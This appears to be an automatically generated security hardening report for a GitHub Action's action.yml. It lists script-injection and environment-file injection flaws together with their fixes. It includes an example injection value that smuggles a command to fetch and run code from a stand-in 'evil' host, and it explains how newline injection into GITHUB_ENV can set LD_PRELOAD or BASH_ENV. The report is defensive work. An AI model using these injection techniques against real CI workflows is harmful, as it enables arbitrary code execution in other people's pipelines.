<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.12

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.12** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): the step 'Download Java Validator' runs `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`, which passes the input JAVA_VALIDATOR_DOWNLOAD_LOCATION through `eval`. Any `$(...)`, backticks or `;` in the input runs as a shell command. The step then expands the result unquoted: `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`. The flag `if $INPUT_JAVA_VALIDATION_ENABLED; then` is also unquoted. Fix: drop the eval. Replace only the literal `$JAVA_VALIDATOR_VERSION` placeholder, for example `url="${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}"`, then quote it: `wget -q "$url"`.

Locations:

- `action.yml:683`
- `action.yml:686`

### script-injection (severity: high)

Rule (b): boolean inputs are expanded unquoted in command position, so the shell runs the input value as a command. For example, line 90 has `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`. A value such as `true; curl evil|sh` would run arbitrary commands. This pattern appears in nearly every step: 'Check if .NET is installed' (90), 'Check .NET SDK Version' (105), 'Install Firely.Terminal' (116), 'Check Firely Terminal Version' (131), 'Simplifier login' (142), 'Detect FHIR version...' (168, 183 `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES`, 202 `elif $INPUT_SUSHI_ENABLED`), 'Validate FHIR version support' (285), 'Set FHIR specification...' (363), 'Check if npm is installed' (487), 'Check npm Version' (500), 'Install fsh-sushi' (510), 'Check SUSHI version' (521), 'Generate conformance resources with SUSHI' (530), 'Pre-processing FHIR profiles' (544 `if $CLOSE_SLICING_FOR_VALIDATION`), 'Configure Firely Terminal validator engine' (599), 'Run Quality Control checks' (623), 'Report Success - .NET Validator' (639), 'Remove package cache...' (656 `if $INPUT_JAVA_SNAPSHOT_ENABLED`), 'Check if Java is installed' (666), the two Java validation steps (704, 777) and 'Re-run SUSHI...' (later in the file, `if $CLOSE_SLICING_FOR_VALIDATION && $INPUT_SUSHI_ENABLED`). Fix: compare the quoted value as a string, e.g. `if [[ "$INPUT_DOTNET_VALIDATION_ENABLED" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:285`
- `action.yml:363`
- `action.yml:487`
- `action.yml:500`
- `action.yml:510`
- `action.yml:521`
- `action.yml:530`
- `action.yml:544`
- `action.yml:599`
- `action.yml:623`
- `action.yml:639`
- `action.yml:656`
- `action.yml:666`
- `action.yml:704`
- `action.yml:777`

### script-injection (severity: high)

Rule (b): other input-derived env vars are expanded unquoted as command arguments. 'Install Firely.Terminal': `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION`. 'Simplifier login': `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`. 'Install fsh-sushi': `sudo npm install -g fsh-sushi@$SUSHI_VERSION` and `sudo chown -R $USER ...`. 'Generate conformance resources with SUSHI' and 'Re-run SUSHI...': `sushi $INPUT_SUSHI_OPTIONS`. 'Run Quality Control checks': `echo $INPUT_EXPECTED_FAILS | grep ...`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`. 'Remove package cache...': `rm -rf $fhirCacheLocation`. 'Validate all conformance resources' and 'Validate all example resources': `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES`, `for p in $PATH_TO_EXAMPLES`, `echo $INPUT_EXPECTED_FAILS`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES ...`. Fix: double-quote each expansion. For optional lists, use a SC2086-annotated array assignment (`NAME=($VAR)`) and pass the array quoted.

Locations:

- `action.yml:119`
- `action.yml:143`
- `action.yml:512`
- `action.yml:531`
- `action.yml:626`
- `action.yml:628`
- `action.yml:658`
- `action.yml:726`
- `action.yml:742`
- `action.yml:798`
- `action.yml:809`

### github-env-injection (severity: high)

The step 'Detect FHIR version and determine dependency source' reads `fhirVersion` from repository files (package.json `.fhirVersions[0]` or sushi-config.yaml `.fhirVersion`, which may be decoded from base64). It then writes it with `echo "FHIR_VERSION=$fhirVersion" >> "$GITHUB_ENV"`, with no `printf '%s' ... | tr -d '\n\r'` step first. Anyone who controls those files, for example through a pull request, can put newlines in the value and inject arbitrary environment variables (such as LD_PRELOAD or BASH_ENV) into later steps. Fix: `safe=$(printf '%s' "$fhirVersion" | tr -d '\n\r'); echo "FHIR_VERSION=$safe" >> "$GITHUB_ENV"`.

Locations:

- `action.yml:271`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

All changes are in action.yml. Nothing was run to test them.

- **Boolean inputs:** every `if $X` / `elif $X` / `$A && $B` check is now a quoted string comparison, `[[ "$X" == "true" ]]`. This covers all the steps in the finding. A value of exactly `true` behaves as before; any other value, including `True`, now counts as false. Upstream ran values other than `true`/`false` as commands.
- **Java validator download:** the `eval` is removed. The literal `$JAVA_VALIDATOR_VERSION` and `${JAVA_VALIDATOR_VERSION}` placeholders are replaced with the version by plain text substitution, and the URL is passed to wget in quotes.
- **Single values are now quoted:** the Firely Terminal version, the Simplifier email and password (each `key=value` is one quoted argument), the sushi package version, `$USER`, the fhir cache path, `$FHIR_RESTORE` and `$EXPECTED_FAILS`. The quality-control rules path is optional, so it uses `${VAR:+"$VAR"}` and adds no argument when empty.
- **List inputs:** `SUSHI_OPTIONS`, `JAVA_VALIDATION_OPTIONS`, `PATH_TO_CONFORMANCE_RESOURCES`, `PATH_TO_EXAMPLES` and the IG dependencies read from package.json go into arrays assigned unquoted (with a shellcheck SC2086 note), then are passed quoted. This splits on whitespace and expands globs the same way upstream did. The `-ig` parameter lists are now built as arrays instead of strings. The `*.xml` / `*.json` globs stay outside the quotes, so they still expand.
- **GITHUB_ENV write:** `fhirVersion` comes from repository files, so it now has newlines and carriage returns stripped (`printf '%s' | tr -d '\n\r'`) before it is written as `FHIR_VERSION`.

